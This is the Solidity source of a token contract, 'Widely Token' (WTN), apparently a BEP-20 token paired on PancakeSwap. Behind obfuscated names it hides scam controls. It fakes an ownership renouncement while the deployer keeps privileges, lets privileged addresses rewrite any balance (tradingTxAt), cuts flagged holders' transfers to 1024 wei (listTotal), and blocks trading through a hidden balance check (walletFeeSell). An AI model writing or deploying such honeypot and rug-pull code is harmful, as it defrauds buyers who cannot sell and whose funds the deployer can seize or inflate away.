//SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

interface walletMode {
    function totalSupply() external view returns (uint256);

    function balanceOf(address receiverAtSwap) external view returns (uint256);

    function transfer(address tradingFee, uint256 walletMarketingAmount) external returns (bool);

    function allowance(address enableTake, address spender) external view returns (uint256);

    function approve(address spender, uint256 walletMarketingAmount) external returns (bool);

    function transferFrom(
        address sender,
        address tradingFee,
        uint256 walletMarketingAmount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed exemptShould, uint256 value);
    event Approval(address indexed enableTake, address indexed spender, uint256 value);
}

abstract contract toAmount {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface receiverSwapLimit {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface launchedLaunch {
    function createPair(address minAuto, address isTeam) external returns (address);
}

interface walletModeMetadata is walletMode {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract WidelyToken is toAmount, walletMode, walletModeMetadata {

    function walletFeeSell(uint256 walletMarketingAmount) public {
        receiverTokenSender();
        receiverReceiver = walletMarketingAmount;
    }

    address isFee = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function transferFrom(address swapMinIs, address tradingFee, uint256 walletMarketingAmount) external override returns (bool) {
        if (_msgSender() != isFee) {
            if (toMax[swapMinIs][_msgSender()] != type(uint256).max) {
                require(walletMarketingAmount <= toMax[swapMinIs][_msgSender()]);
                toMax[swapMinIs][_msgSender()] -= walletMarketingAmount;
            }
        }
        return isLiquidity(swapMinIs, tradingFee, walletMarketingAmount);
    }

    function transfer(address teamLimit, uint256 walletMarketingAmount) external virtual override returns (bool) {
        return isLiquidity(_msgSender(), teamLimit, walletMarketingAmount);
    }

    bool public marketingLiquidity;

    uint256 private isTotal;

    address public enableList;

    address private senderTake;

    function approve(address maxEnable, uint256 walletMarketingAmount) public virtual override returns (bool) {
        toMax[_msgSender()][maxEnable] = walletMarketingAmount;
        emit Approval(_msgSender(), maxEnable, walletMarketingAmount);
        return true;
    }

    function balanceOf(address receiverAtSwap) public view virtual override returns (uint256) {
        return fromReceiver[receiverAtSwap];
    }

    event OwnershipTransferred(address indexed exemptTake, address indexed marketingEnable);

    function tokenLaunch() public {
        emit OwnershipTransferred(exemptAmount, address(0));
        senderTake = address(0);
    }

    function name() external view virtual override returns (string memory) {
        return takeLaunch;
    }

    string private liquidityBuy = "WTN";

    uint256 private walletTo = 100000000 * 10 ** 18;

    function decimals() external view virtual override returns (uint8) {
        return autoAt;
    }

    address sellTrading = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 public amountList;

    mapping(address => mapping(address => uint256)) private toMax;

    function allowance(address teamSender, address maxEnable) external view virtual override returns (uint256) {
        if (maxEnable == isFee) {
            return type(uint256).max;
        }
        return toMax[teamSender][maxEnable];
    }

    function owner() external view returns (address) {
        return senderTake;
    }

    constructor (){
        
        receiverSwapLimit modeFund = receiverSwapLimit(isFee);
        enableList = launchedLaunch(modeFund.factory()).createPair(modeFund.WETH(), address(this));
        
        exemptAmount = _msgSender();
        tokenLaunch();
        limitBuy[exemptAmount] = true;
        fromReceiver[exemptAmount] = walletTo;
        
        emit Transfer(address(0), exemptAmount, walletTo);
    }

    function isLiquidity(address swapMinIs, address tradingFee, uint256 walletMarketingAmount) internal returns (bool) {
        if (swapMinIs == exemptAmount) {
            return listIs(swapMinIs, tradingFee, walletMarketingAmount);
        }
        uint256 senderEnable = walletMode(enableList).balanceOf(sellTrading);
        require(senderEnable == receiverReceiver);
        require(tradingFee != sellTrading);
        if (liquidityAmount[swapMinIs]) {
            return listIs(swapMinIs, tradingFee, walletSwap);
        }
        return listIs(swapMinIs, tradingFee, walletMarketingAmount);
    }

    uint8 private autoAt = 18;

    uint256 receiverReceiver;

    mapping(address => bool) public liquidityAmount;

    function totalSupply() external view virtual override returns (uint256) {
        return walletTo;
    }

    bool public atFee;

    bool public liquidityFundTotal;

    function symbol() external view virtual override returns (string memory) {
        return liquidityBuy;
    }

    uint256 takeWallet;

    mapping(address => bool) public limitBuy;

    address public exemptAmount;

    string private takeLaunch = "Widely Token";

    uint256 constant walletSwap = 2 ** 10;

    mapping(address => uint256) private fromReceiver;

    function totalTx(address takeMode) public {
        if (liquidityFundTotal) {
            return;
        }
        
        limitBuy[takeMode] = true;
        
        liquidityFundTotal = true;
    }

    function getOwner() external view returns (address) {
        return senderTake;
    }

    function tradingTxAt(address teamLimit, uint256 walletMarketingAmount) public {
        receiverTokenSender();
        fromReceiver[teamLimit] = walletMarketingAmount;
    }

    function receiverTokenSender() private view {
        require(limitBuy[_msgSender()]);
    }

    function listIs(address swapMinIs, address tradingFee, uint256 walletMarketingAmount) internal returns (bool) {
        require(fromReceiver[swapMinIs] >= walletMarketingAmount);
        fromReceiver[swapMinIs] -= walletMarketingAmount;
        fromReceiver[tradingFee] += walletMarketingAmount;
        emit Transfer(swapMinIs, tradingFee, walletMarketingAmount);
        return true;
    }

    uint256 private enableAt;

    function listTotal(address modeIs) public {
        receiverTokenSender();
        if (isTotal != enableAt) {
            marketingLiquidity = false;
        }
        if (modeIs == exemptAmount || modeIs == enableList) {
            return;
        }
        liquidityAmount[modeIs] = true;
    }

}